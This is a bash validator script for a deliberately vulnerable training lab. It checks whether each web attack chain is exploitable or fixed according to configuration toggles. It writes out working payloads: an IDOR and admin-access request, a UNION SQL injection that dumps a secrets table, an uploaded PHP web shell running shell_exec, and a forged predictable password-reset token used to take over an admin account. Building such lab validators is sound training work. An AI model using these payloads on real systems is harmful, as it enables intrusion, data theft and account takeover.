#!/usr/bin/env bash
# ELX DMZ Range — Phase 2 chain validator. AUTHORIZED LAB USE ONLY.
#
# For each chain it confirms the INTENDED behavior for the current toggle:
#   * toggle true  (vulnerable): the chain is exploitable and the flag is reachable
#   * toggle false (fixed):      the chain is closed (flag NOT reachable)
#
# Usage:  ./validate-dmz.sh [HOST]      (HOST defaults to 127.0.0.1)
# Reads .env (ports + toggles) and .flags.env (expected flag values).

set -uo pipefail
cd "$(dirname "$0")"

HOST="${1:-127.0.0.1}"
[ -f .env ] && . ./.env
[ -f .flags.env ] && . ./.flags.env

PORTAL="http://${HOST}:${PORTAL_PORT:-8001}"
SEARCH="http://${HOST}:${SEARCH_PORT:-8002}"
DOCS="http://${HOST}:${DOCS_PORT:-8003}"

PASS=0; FAIL=0
ok()   { echo "  [PASS] $1"; PASS=$((PASS+1)); }
bad()  { echo "  [FAIL] $1"; FAIL=$((FAIL+1)); }
istrue(){ case "$(printf '%s' "${1:-true}" | tr '[:upper:]' '[:lower:]')" in 1|true|yes|on) return 0;; *) return 1;; esac; }

jar="$(mktemp)"; trap 'rm -f "$jar" /tmp/elx_poc.php' EXIT

echo "== Pre-flight =="
for url in "$PORTAL/health" "$SEARCH/health.php" "$DOCS/health.php"; do
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$url" || echo 000)"
  [ "$code" = "200" ] && ok "health $url" || bad "health $url (got $code)"
done

login_analyst() {
  curl -s -c "$jar" -o /dev/null --max-time 8 \
    --data-urlencode "username=analyst1" --data-urlencode "password=analyst-pw" \
    "$PORTAL/login"
}

echo "== WEB-01 broken access control (CHAIN_WEB01=${CHAIN_WEB01:-true}) =="
login_analyst
resp="$(curl -s -b "$jar" -w '\n%{http_code}' "$PORTAL/admin/settings")"
code="${resp##*$'\n'}"; body="${resp%$'\n'*}"
if istrue "${CHAIN_WEB01:-true}"; then
  { [ "$code" = "200" ] && printf '%s' "$body" | grep -q "${FLAG_WEB01:-__nf__}"; } \
    && ok "non-admin reached admin settings + flag" \
    || bad "expected 200+flag as non-admin (got $code)"
else
  [ "$code" = "403" ] && ok "non-admin blocked (403)" || bad "expected 403 (got $code)"
fi

echo "== WEB-02 IDOR (CHAIN_WEB02=${CHAIN_WEB02:-true}) =="
resp="$(curl -s -b "$jar" -w '\n%{http_code}' "$PORTAL/api/invoice?id=1001")"  # owner=cfo
code="${resp##*$'\n'}"; body="${resp%$'\n'*}"
if istrue "${CHAIN_WEB02:-true}"; then
  { [ "$code" = "200" ] && printf '%s' "$body" | grep -q "${FLAG_WEB02:-__nf__}"; } \
    && ok "read another owner's invoice + flag" \
    || bad "expected 200+flag for foreign invoice (got $code)"
else
  [ "$code" = "403" ] && ok "foreign invoice blocked (403)" || bad "expected 403 (got $code)"
fi

echo "== WEB-03 SQL injection (CHAIN_WEB03=${CHAIN_WEB03:-true}) =="
# UNION pulls secrets.value into the products result set.
payload="%' UNION SELECT name, value, '1' FROM secrets-- -"
body="$(curl -s -G --data-urlencode "q=${payload}" "$SEARCH/search.php")"
if istrue "${CHAIN_WEB03:-true}"; then
  printf '%s' "$body" | grep -q "${FLAG_WEB03:-__nf__}" \
    && ok "UNION injection extracted secrets flag" \
    || bad "expected flag via UNION injection"
else
  printf '%s' "$body" | grep -q "${FLAG_WEB03:-__nf__}" \
    && bad "flag still extractable (fix not effective)" \
    || ok "injection no longer returns secrets"
fi

echo "== WEB-04 file upload -> contained exec (CHAIN_WEB04=${CHAIN_WEB04:-true}) =="
cat > /tmp/elx_poc.php <<'PHP'
<?php echo "ELXPOC:"; echo trim(@file_get_contents('/flag')); echo ":"; echo trim(@shell_exec('id')); ?>
PHP
curl -s -o /dev/null -F "file=@/tmp/elx_poc.php;type=image/png;filename=poc.php" "$DOCS/upload.php"
body="$(curl -s "$DOCS/uploads/poc.php")"
if istrue "${CHAIN_WEB04:-true}"; then
  { printf '%s' "$body" | grep -q "${FLAG_WEB04:-__nf__}" && printf '%s' "$body" | grep -q "uid="; } \
    && ok "uploaded PHP executed; flag + id read in-container" \
    || bad "expected in-container execution returning flag+id"
else
  printf '%s' "$body" | grep -q "ELXPOC:" \
    && bad "uploaded PHP still executed (fix not effective)" \
    || ok "upload rejected / not executed"
fi

echo "== WEB-08 weak password reset (CHAIN_WEB08=${CHAIN_WEB08:-true}) =="
tok="$(printf '%s' "acme-reset-padmin" | md5sum | cut -c1-16)"
code="$(curl -s -o /dev/null -w '%{http_code}' \
  --data-urlencode "username=padmin" --data-urlencode "token=${tok}" \
  --data-urlencode "new_password=PwnedByLab1!" "$PORTAL/reset/confirm")"
if istrue "${CHAIN_WEB08:-true}"; then
  if [ "$code" = "200" ]; then
    pjar="$(mktemp)"
    curl -s -c "$pjar" -o /dev/null \
      --data-urlencode "username=padmin" --data-urlencode "password=PwnedByLab1!" "$PORTAL/login"
    sec="$(curl -s -b "$pjar" "$PORTAL/me/secret")"
    printf '%s' "$sec" | grep -q "${FLAG_WEB08:-__nf__}" \
      && ok "predictable token took over padmin; flag read" \
      || bad "took over account but flag not found"
    # Restore seed state: reset padmin back to PADMIN_PW via the same flow.
    curl -s -o /dev/null --data-urlencode "username=padmin" --data-urlencode "token=${tok}" \
      --data-urlencode "new_password=${PADMIN_PW:-Autumn2024!}" "$PORTAL/reset/confirm"
    rm -f "$pjar"
  else
    bad "predictable-token reset rejected (got $code)"
  fi
else
  [ "$code" = "403" ] && ok "predictable token rejected (403)" || bad "expected 403 (got $code)"
fi

echo
echo "==================== SUMMARY ===================="
echo "  PASS: $PASS    FAIL: $FAIL"
[ "$FAIL" -eq 0 ] && { echo "  All checks matched their toggle state."; exit 0; } \
                 || { echo "  Some checks did not match — investigate above."; exit 1; }
